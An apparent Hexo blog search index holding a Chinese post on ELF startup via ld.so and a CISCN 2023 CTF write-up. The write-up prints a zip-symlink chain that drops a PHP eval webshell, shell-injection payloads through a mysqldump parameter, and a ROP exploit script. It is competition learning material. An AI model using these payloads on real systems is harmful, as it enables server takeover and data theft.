<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>程序启动过程分析</title>
    <link href="/page/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <url>/page/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<blockquote><p>心血来潮想要看看程序到底是怎么开始的，于是就有了这篇文章</p></blockquote><h2 id="大致流程图">大致流程图</h2><p><img src="/img/blog_img/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B.png" srcset="/img/loading.gif" lazyload alt="程序执行流程" title="程序执行流程"></p><h2 id="分析">分析</h2><p>起初,我以为加载依赖等操作是在<code>__libc_start_main</code>中执行的,于是我使用gdb调试程序,并把断点下在了<code>_start</code>处.</p><p>我发现这个时候断点列表中有两个,一个指向了<code>ld.so::_start</code>,一个指向了<code>elf::_start</code>.</p><p>从这里我就知道了,要想知道实际上是怎么执行的,我不能只看<code>__libc_start_main</code>函数的源码,得从<code>ld.so::_start</code>开始看</p><h3 id="start-dl-start-user">_start&amp;&amp;_dl_start_user</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// #define RTLD_START</span><br>.text<br>        .align <span class="hljs-number">16</span><br>.globl _start<br>.globl _dl_start_user<br>_start:<br>        movq %rsp, %rdi<br>        call _dl_start<br>_dl_start_user:<br>        # Save the user entry point address in %r12.<br>        movq %rax, %r12<br>        # Read the original argument count.<br>        movq (%rsp), %rdx<br>        # Call _dl_init (<span class="hljs-keyword">struct</span> link_map *main_map, <span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **env)<br>        <span class="hljs-meta"># argc -&gt; rsi</span><br>        movq %rdx, %rsi<br>        # Save %rsp value in %r13.<br>        movq %rsp, %r13<br>        # And align <span class="hljs-built_in">stack</span> <span class="hljs-keyword">for</span> the _dl_init call.<br>        andq $<span class="hljs-number">-16</span>, %rsp<br>        # _dl_loaded -&gt; rdi<br>        movq _rtld_local(%rip), %rdi<br>        <span class="hljs-meta"># env -&gt; rcx</span><br>        leaq <span class="hljs-number">16</span>(%r13,%rdx,<span class="hljs-number">8</span>), %rcx<br>        <span class="hljs-meta"># argv -&gt; rdx</span><br>        leaq <span class="hljs-number">8</span>(%r13), %rdx<br>        # Clear %rbp to mark outermost frame obviously even <span class="hljs-keyword">for</span> constructors.<br>        xorl %ebp, %ebp<br>        # Call the function to run the initializers.<br>        call _dl_init<br>        # Pass our finalizer function to the user in %rdx, as per ELF ABI.<br>        leaq _dl_fini(%rip), %rdx<br>        # And make sure %rsp points to argc stored on the <span class="hljs-built_in">stack</span>.<br>        movq %r13, %rsp<br>        # Jump to the user<span class="hljs-number">&#x27;</span>s entry point.<br>        jmp *%r12<br>.previous<br></code></pre></td></tr></table></figure><p>空间管理使用minimal，第一次申请的地址最高，后面申请的比前面的低，通常同一个程序如果使用相同的依赖库，则每次执行时依赖的地址都相同<br>程序是通过系统的<code>ld.so</code>进行启动的<br>在执行ld.so的_start函数之前先把程序与ld.so都加载到内存中<br>并且将程序的hurd信息放入栈中，在执行_dl_main之前解析了栈中的hurt信息，并传入_dl_main<br>用于构造程序的link_map结构体时解析程序</p><p><code>__libc_start_main</code>用于配置环境，这些环境通常在<code>_dl_start</code>中已经完成</p><blockquote><p>程序启动时先执行<code>_start</code>函数</p></blockquote><p>执行程序时栈空间指向了一个<code>argc,argv,envp</code>和一个<code>hurd_startup_data</code>结构体<br>程序执行时会先进入<code>ld.so</code>的<code>_start</code>函数,所以在调用<code>dl_main</code>之前的所有函数都是用来初始化<code>ld.so</code>的运行环境的</p><blockquote><p>在<code>_start</code>函数中执行了<code>_dl_start</code>函数<br>在这个函数中会解析<code>ld</code>库,然后会执行<code>_dl_start_final</code><br>在<code>_dl_start_final</code>中会调用<code>_dl_sysdep_start</code>函数<br>这个函数中会初始化环境变量与参数等，并且会调用<code>dl_main</code><br>在<code>dl_main</code>中，会如果</p></blockquote><p>link_map中l_local_scope用来储存搜索符号用的link_map地址是一个数组与l_scope相同<br>库中的函数是以符号名称的hash进行分组，寻找库中的函数是从对应分组中查询相同hash且名称相同的symtab项从而得到函数真实地址</p><p>DT_FLAGS的作用是用来设置DT_BIND_NOW和DT_TEXTREL与DT_SYMBOLIC<br>DT_BIND_NOW用于判断是否使用延迟绑定<br>DT_SYMBOLIC用于判断是否为库文件<br>DT_TEXTREL可能用于判断代码段是否需要重定向</p>]]></content>
    
    
    <categories>
      
      <category>pwnbase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023ciscn初赛wp</title>
    <link href="/page/wp/2023ciscn%E5%88%9D%E8%B5%9Bwp/"/>
    <url>/page/wp/2023ciscn%E5%88%9D%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1>misc</h1><h2 id="签到卡">签到卡</h2><p><code>print(open('/flag').read())</code></p><p><img src="/img/blog_img/CISCN/page_Image/ffdffe97bf7f622c865051c4af9005c87b62167cdf9ddb26906302c7215458b8.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="被加密的生产流量">被加密的生产流量</h2><p>追踪tcp流，数据提取出来base32</p><p><img src="/img/blog_img/CISCN/page_Image/d10ed5dec2efee59d1703eb0acdd371985cafc0ce80a5f3372c1097d2ffe7383.png" srcset="/img/loading.gif" lazyload alt=""></p><p><img src="/img/blog_img/CISCN/page_Image/25d0ddcdf78dfc2407caa2984f63055509a22fe68a93d1e1813baf0799f7755a.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="国粹">国粹</h2><p>先分割<code>题目.png</code>中的小麻将到<code>output</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>w=<span class="hljs-number">0</span><br>h=<span class="hljs-number">0</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;题目.png&#x27;</span>)<br><br>w1,h1=a.size<br><span class="hljs-keyword">while</span> w&lt;w1:<br>    im=a.crop((w,h,w+<span class="hljs-number">53</span>,h+<span class="hljs-number">73</span>))<br>    im.save(os.path.join(<span class="hljs-string">&#x27;output&#x27;</span>,<span class="hljs-built_in">str</span>(w))+<span class="hljs-string">&#x27;.png&#x27;</span>)<br>    w+=<span class="hljs-number">53</span><br><br></code></pre></td></tr></table></figure><p>再将<code>a.png</code>和<code>k.png</code>中的小麻将去<code>output</code>找对应的索引值，分别作为纵坐标和横坐标画图得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a=cv2.imread(<span class="hljs-string">&quot;a.png&quot;</span>)<br>k=cv2.imread(<span class="hljs-string">&quot;k.png&quot;</span>)<br>w=<span class="hljs-built_in">len</span>(a[<span class="hljs-number">0</span>])<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">import</span> os<br>path=<span class="hljs-string">&#x27;output/&#x27;</span><br>d=os.listdir(path)<br>d.remove(<span class="hljs-string">&quot;0.png&quot;</span>)<br>data=[[],[]]<br>Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">im1,im2,sind</span>):<br>    A=cv2.absdiff(im1,im2)<br>    <span class="hljs-keyword">if</span> np.count_nonzero(A) ==<span class="hljs-number">0</span> :<br>        Status[sind]=<span class="hljs-literal">True</span><br>        ind=<span class="hljs-built_in">int</span>(j.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> ind!=<span class="hljs-number">0</span>:<br>            data[sind].append(ind//<span class="hljs-number">53</span>)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">while</span> i&lt;w:<br>    ima=a[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    imk=k[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> d:<br>        im2=cv2.imread(os.path.join(path,j))<br>        check(ima,im2,<span class="hljs-number">0</span>)<br>        check(imk,im2,<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> Status==[<span class="hljs-literal">True</span>,<span class="hljs-literal">True</span>]:<br>            <span class="hljs-keyword">break</span><br>    i+=<span class="hljs-number">53</span><br><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">42</span>,<span class="hljs-number">42</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w//<span class="hljs-number">53</span>):<br>    a.putpixel((data[<span class="hljs-number">1</span>][i],data[<span class="hljs-number">0</span>][i]),<span class="hljs-number">255</span>)<br>a.save(<span class="hljs-string">&#x27;123.png&#x27;</span>)<br>a.show()<br></code></pre></td></tr></table></figure><h1>crypto</h1><h2 id="基于国密SM2算法的密钥密文分发">基于国密SM2算法的密钥密文分发</h2><p>根据文档一步一步来即可，虽然有点没看懂</p><p>先找个网址生成一组公钥和密钥 <a href="https://www.lzltool.com/SM2">https://www.lzltool.com/SM2</a></p><p>登录拿id</p><p><img src="/img/blog_img/CISCN/page_Image/097019e2de3c0e24a8b82073bc4d12e4532edb2c5d9bdc0b78949f4dc344464e.png" srcset="/img/loading.gif" lazyload alt=""></p><p>上传公钥</p><p><img src="/img/blog_img/CISCN/page_Image/df23bd6e9ea2da15d3ebf3cfd12d5b8b8a1ee1d4e0f5820ff19bb9cfbc433285.png" srcset="/img/loading.gif" lazyload alt=""></p><p>访问<code>/api/quantum</code>获取密钥密文</p><p>访问<code>/api/check</code>发送<code>quantumString</code>的值</p><p>使<code>quantumStringUser</code>的值等于<code>quantumStringServer</code>的值即可通过验证</p><p>访问<code>/api/search</code>得到flag</p><p><img src="/img/blog_img/CISCN/page_Image/9bc52566499d1a94271c8f21d50ebadec4503adfc966449cc0486795835b9f56.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="可信度量">可信度量</h2><p>非预期</p><p><code>/proc/22/task/22/environ</code>可以直接看到flag</p><p><img src="/img/blog_img/CISCN/page_Image/6b104e57915286602e1c61bd16bf846044a99978da02cf252338bd65530caac6.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="Sign-in-passwd">Sign_in_passwd</h2><p>base64换表</p><p><img src="/img/blog_img/CISCN/page_Image/3738283b3b0da9931287367453fe2481d4b361a998677b71850b0b3297a6b2f0.png" srcset="/img/loading.gif" lazyload alt=""></p><h1>web</h1><h2 id="unzip">unzip</h2><p>上传后返回源码</p><p>只能上传<code>zip</code>文件，上传后在<code>tmp</code>目录使用<code>unzip -o</code>解压</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this!</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">//构造一个指向/var/www/html的软连接<br><span class="hljs-built_in">ln</span> -s /var/www/html poc<br><br>//保留软连接压缩<br>zip --symlinks test.zip poc<br><br>//创建跟第一个压缩包中目录同名的目录<br><span class="hljs-built_in">mkdir</span> poc<br><br>//接着向目录中写一个shell<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt; ./poc/shell.php<br><br>//压缩这个目录<br>zip -r test1.zip poc<br></code></pre></td></tr></table></figure><p>上传第一个压缩包后会在<code>tmp</code>目录下生成一个软连接到<code>/var/www/html</code>，当我们上传第二个压缩包时，因为<code>poc</code>目录已经软连接到<code>/var/www/html</code>了，所以解压的时候会把<code>shell.php</code>放在<code>/var/www/html</code></p><p><img src="/img/blog_img/CISCN/page_Image/afee797b97dabfc906aaf8cc7a1b69189372fbccd7bcc64548a026f88abd237e.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="dumpit">dumpit</h2><p>根据题目描述可知分别有查询和导出的功能点</p><p>根据执行命令后的返回值推测执行的命令如下</p><p>传入<code>?db=a&amp;table_2_query=b</code>时会执行<code>select * from a.b</code><br>传入<code>?db=a&amp;table_2_dump=b</code>时会执行<code>mysqldump -u root a b &gt; log/xxx.log</code></p><p>这里因为<code>a</code>和<code>b</code>的值可控，所以相当于我们可以执行命令了</p><p>方法1：<br>直接传<code>?db=ctf&amp;table_2_dump=%0a+id+&gt;+log/1+%0</code>，然后访问<code>log/1</code></p><p>方法2：<br>因为<code>mysqldump</code>在找不到我们给出的表的情况下会抛出错误信息<code>mysqldump: Couldn't find table: &quot;表名&quot;</code></p><p>在<code>linux</code>中可以利用<code>2&gt;</code>将命令执行的结果输出到文件中</p><p>传<code>/?db=ctf&amp;table_2_dump=\&lt;\?\=phpinfo\(\)?\&gt;+2&gt;+log/1.php</code>，然后访问<code>1.php</code></p><p><img src="/img/blog_img/CISCN/page_Image/1a44d8d17e70f4d8638ee3fae6882430beb3fe6d91b89dcb53f6e6f2161241b9.png" srcset="/img/loading.gif" lazyload alt=""></p><p>index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;www-data&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black</span> = <span class="hljs-string">&#x27;;`*#^$&amp;|&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$black</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$black</span>[<span class="hljs-variable">$i</span>])===<span class="hljs-literal">FALSE</span>))&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;host&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;-h&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=ctf&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1&#x27;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$db</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no db!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2q</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from <span class="hljs-subst">$db</span>.<span class="hljs-subst">$t2q</span>&quot;</span>;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2q</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-variable">$stm</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$stm</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$res</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2d</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2d</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$randstr</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>());<br>    <span class="hljs-variable">$dump</span>=<span class="hljs-string">&#x27;mariadb-dump &#x27;</span>.<span class="hljs-variable">$db</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$t2d</span>.<span class="hljs-string">&#x27; &gt;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$dump</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;dump log here: &lt;a href=\&#x27;&#x27;</span>.<span class="hljs-string">&#x27;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>.<span class="hljs-string">&#x27;\&#x27;&gt;here&lt;/a&gt;&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1>pwn</h1><h2 id="烧烤摊儿">烧烤摊儿</h2><p>修改名称存在栈溢出，程序不存在<code>system</code>函数，使用<code>orw</code>获取<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ppwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./shaokao&#x27;)</span><br>p=Remote(<span class="hljs-string">&quot;123.56.251.120 12585&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br><br>fopen=e.sym[<span class="hljs-string">&#x27;open64&#x27;</span>]<br>read=e.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=e.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401fae&#x27;)</span><br>rdi=<span class="hljs-number">0x000000000040264f</span> <span class="hljs-comment">#rdi</span><br>rsi=<span class="hljs-number">0x000000000040a67e</span> <span class="hljs-comment">#rsi</span><br>rdx=<span class="hljs-number">0x00000000004a404b</span> <span class="hljs-comment">#rdx rbx</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-100000&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(rdi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(fopen)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(read)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(write)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 